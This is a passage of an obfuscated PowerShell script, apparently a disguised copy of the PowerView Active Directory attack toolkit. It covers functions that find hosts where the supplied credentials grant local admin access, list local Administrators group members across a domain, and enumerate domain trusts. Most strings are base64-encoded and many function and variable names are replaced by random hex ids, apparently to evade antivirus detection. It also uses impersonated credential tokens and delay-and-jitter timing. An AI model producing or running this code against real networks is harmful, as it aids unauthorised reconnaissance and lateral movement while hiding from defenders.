        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${f613cdfca6cd4ec9830841a185fa0248} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${a641242359464a5bb75a49b867c183a4} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${de1879a6375144efa1511357bfecd42f} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${b0dd23003b9d4473818f6e8c6cc2e082} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${ca0e0dbccca747a0b83a2af44d4d9165} = ${ac645935110b4eaea96e7bf6f0b2d7f4}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${ca0e0dbccca747a0b83a2af44d4d9165} = cec1def5409041f78ed8ecd436f7fa52 @f613cdfca6cd4ec9830841a185fa0248 | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $(${ca0e0dbccca747a0b83a2af44d4d9165}.Length)"
        if (${ca0e0dbccca747a0b83a2af44d4d9165}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        ${91e68d106c5344ba911e56802fc167ea} = {
            Param(${ac645935110b4eaea96e7bf6f0b2d7f4}, ${d4e1296b557440d7b406a9378e307719})
            if (${d4e1296b557440d7b406a9378e307719}) {
                $Null = cb88cae78c7042af8720773b18453f4d -d4e1296b557440d7b406a9378e307719 ${d4e1296b557440d7b406a9378e307719} -e63bcfc245bf4c15941e2e6d5c906ee3
            }
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
                ${d7b577ae558c406581a98832155768ff} = Test-Connection -Count 1 -Quiet -ComputerName ${f54716d2d17141569e4a6cfb0d93653b}
                if (${d7b577ae558c406581a98832155768ff}) {
                    ${2200cba783f346d0a20f5a0588aa0e2f} = c046e85b237e4b6eb3504c4f264b59a2 -ac645935110b4eaea96e7bf6f0b2d7f4 ${f54716d2d17141569e4a6cfb0d93653b}
                    if (${2200cba783f346d0a20f5a0588aa0e2f}.IsAdmin) {
                        ${f54716d2d17141569e4a6cfb0d93653b}
                    }
                }
            }
            if (${d4e1296b557440d7b406a9378e307719}) {
                dcf0a8b111a84302b05d40b1db05338c
            }
        }
        ${9d861c835c924c73aa92c66fb935caca} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
            }
            else {
                ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential -e63bcfc245bf4c15941e2e6d5c906ee3
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $(${ca0e0dbccca747a0b83a2af44d4d9165}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${521aceac22ed4af69dedda38f567c0ac} = 0
            ${6c074dff13fb478aa365aea23a93e2d2} = New-Object System.Random
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ca0e0dbccca747a0b83a2af44d4d9165}) {
                ${521aceac22ed4af69dedda38f567c0ac} = ${521aceac22ed4af69dedda38f567c0ac} + 1
                Start-Sleep -Seconds ${6c074dff13fb478aa365aea23a93e2d2}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-LocalAdminAccess] Enumerating server ${f54716d2d17141569e4a6cfb0d93653b} (${521aceac22ed4af69dedda38f567c0ac} of $(${ca0e0dbccca747a0b83a2af44d4d9165}.count))"
                Invoke-Command -ScriptBlock ${91e68d106c5344ba911e56802fc167ea} -ArgumentList ${f54716d2d17141569e4a6cfb0d93653b}, ${9d861c835c924c73aa92c66fb935caca}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${96683e5d4de842f184dbc8ff33d066b2} = @{
                'TokenHandle' = ${9d861c835c924c73aa92c66fb935caca}
            }
            afa7981a0a8840e7ae58b8e0c696a5d3 -ac645935110b4eaea96e7bf6f0b2d7f4 ${ca0e0dbccca747a0b83a2af44d4d9165} -d8bca3485d0e4462855c0f18d0a8d91d ${91e68d106c5344ba911e56802fc167ea} -bf25cd70880740848c7344c3829474ee ${96683e5d4de842f184dbc8ff33d066b2} -Threads $Threads
        }
    }
}
function Find-DomainLocalGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${14eb3c56654d4851b0c0e59e10d33e62} = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${f613cdfca6cd4ec9830841a185fa0248} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${a641242359464a5bb75a49b867c183a4} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${de1879a6375144efa1511357bfecd42f} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${b0dd23003b9d4473818f6e8c6cc2e082} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${ca0e0dbccca747a0b83a2af44d4d9165} = ${ac645935110b4eaea96e7bf6f0b2d7f4}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${ca0e0dbccca747a0b83a2af44d4d9165} = cec1def5409041f78ed8ecd436f7fa52 @f613cdfca6cd4ec9830841a185fa0248 | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $(${ca0e0dbccca747a0b83a2af44d4d9165}.Length)"
        if (${ca0e0dbccca747a0b83a2af44d4d9165}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        ${91e68d106c5344ba911e56802fc167ea} = {
            Param(${ac645935110b4eaea96e7bf6f0b2d7f4}, ${14eb3c56654d4851b0c0e59e10d33e62}, $Method, ${d4e1296b557440d7b406a9378e307719})
            if (${14eb3c56654d4851b0c0e59e10d33e62} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                ${572081a462a04af3b0ef61d26eef2e5a} = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                ${14eb3c56654d4851b0c0e59e10d33e62} = (${572081a462a04af3b0ef61d26eef2e5a}.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if (${d4e1296b557440d7b406a9378e307719}) {
                $Null = cb88cae78c7042af8720773b18453f4d -d4e1296b557440d7b406a9378e307719 ${d4e1296b557440d7b406a9378e307719} -e63bcfc245bf4c15941e2e6d5c906ee3
            }
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
                ${d7b577ae558c406581a98832155768ff} = Test-Connection -Count 1 -Quiet -ComputerName ${f54716d2d17141569e4a6cfb0d93653b}
                if (${d7b577ae558c406581a98832155768ff}) {
                    ${028e4e8cdca9494bb3ef60e2dfb0eb6f} = @{
                        'ComputerName' = ${f54716d2d17141569e4a6cfb0d93653b}
                        'Method' = $Method
                        'GroupName' = ${14eb3c56654d4851b0c0e59e10d33e62}
                    }
                    e150f28bcce5485f91fe17db27bed54c @028e4e8cdca9494bb3ef60e2dfb0eb6f
                }
            }
            if (${d4e1296b557440d7b406a9378e307719}) {
                dcf0a8b111a84302b05d40b1db05338c
            }
        }
        ${9d861c835c924c73aa92c66fb935caca} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
            }
            else {
                ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential -e63bcfc245bf4c15941e2e6d5c906ee3
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $(${ca0e0dbccca747a0b83a2af44d4d9165}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${521aceac22ed4af69dedda38f567c0ac} = 0
            ${6c074dff13fb478aa365aea23a93e2d2} = New-Object System.Random
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ca0e0dbccca747a0b83a2af44d4d9165}) {
                ${521aceac22ed4af69dedda38f567c0ac} = ${521aceac22ed4af69dedda38f567c0ac} + 1
                Start-Sleep -Seconds ${6c074dff13fb478aa365aea23a93e2d2}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server ${f54716d2d17141569e4a6cfb0d93653b} (${521aceac22ed4af69dedda38f567c0ac} of $(${ca0e0dbccca747a0b83a2af44d4d9165}.count))"
                Invoke-Command -ScriptBlock ${91e68d106c5344ba911e56802fc167ea} -ArgumentList ${f54716d2d17141569e4a6cfb0d93653b}, ${14eb3c56654d4851b0c0e59e10d33e62}, $Method, ${9d861c835c924c73aa92c66fb935caca}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${96683e5d4de842f184dbc8ff33d066b2} = @{
                'GroupName' = ${14eb3c56654d4851b0c0e59e10d33e62}
                'Method' = $Method
                'TokenHandle' = ${9d861c835c924c73aa92c66fb935caca}
            }
            afa7981a0a8840e7ae58b8e0c696a5d3 -ac645935110b4eaea96e7bf6f0b2d7f4 ${ca0e0dbccca747a0b83a2af44d4d9165} -d8bca3485d0e4462855c0f18d0a8d91d ${91e68d106c5344ba911e56802fc167ea} -bf25cd70880740848c7344c3829474ee ${96683e5d4de842f184dbc8ff33d066b2} -Threads $Threads
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function cb9ebd1093564537889c09a039433bbe {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${ef05e9403b424bc983087be445a0d7b4} = @{
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAE4AXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBQAEwARQBWAEUATABfAE8ATgBMAFkA')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBJAEwAVABFAFIAXwBTAEkARABTAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBPAFIARQBTAFQAXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAFQASABJAE4AXwBGAE8AUgBFAFMAVAA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAEUAQQBUAF8AQQBTAF8ARQBYAFQARQBSAE4AQQBMAA==')))
